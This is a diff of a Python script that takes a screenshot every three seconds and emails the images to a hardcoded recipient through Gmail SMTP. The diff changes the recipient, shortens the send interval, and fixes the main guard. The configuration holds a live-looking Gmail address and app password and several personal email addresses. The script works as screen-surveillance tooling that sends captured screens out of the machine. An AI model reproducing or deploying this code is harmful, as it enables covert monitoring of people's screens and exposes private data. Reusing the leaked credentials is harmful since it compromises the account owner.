@@ -6,16 +6,15 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 from datetime import datetime
-
-# Configuration
+ 
 EMAIL = 'johnjw2007@gmail.com'  # Your email
 PASSWORD = 'sowe ocmn qtjr jsmt'  # Your email password
-TO_EMAIL = '9116johnjw24@gmail.com'  # Recipient's email
+TO_EMAIL = 'kumaravelkuma07@gmail.com'  # Recipient's email
 SMTP_SERVER = 'smtp.gmail.com'  # For Gmail
 SMTP_PORT = 587  # For Gmail
 SCREENSHOT_FOLDER = 'screenshots'  # Folder to store screenshots
 SCREENSHOT_INTERVAL = 3  # Interval in seconds to take screenshots
-SEND_INTERVAL = 60  # Interval in seconds to send emails with screenshots
+SEND_INTERVAL = 10  # Interval in seconds to send emails with screenshots
 
 # Create a folder to store screenshots if it doesn't exist
 if not os.path.exists(SCREENSHOT_FOLDER):
@@ -71,5 +70,5 @@ def main():
 
         time.sleep(SCREENSHOT_INTERVAL)  # Wait for the next screenshot
 
-if _name_ == '_main_':
+if __name__ == '__main__':
     main()
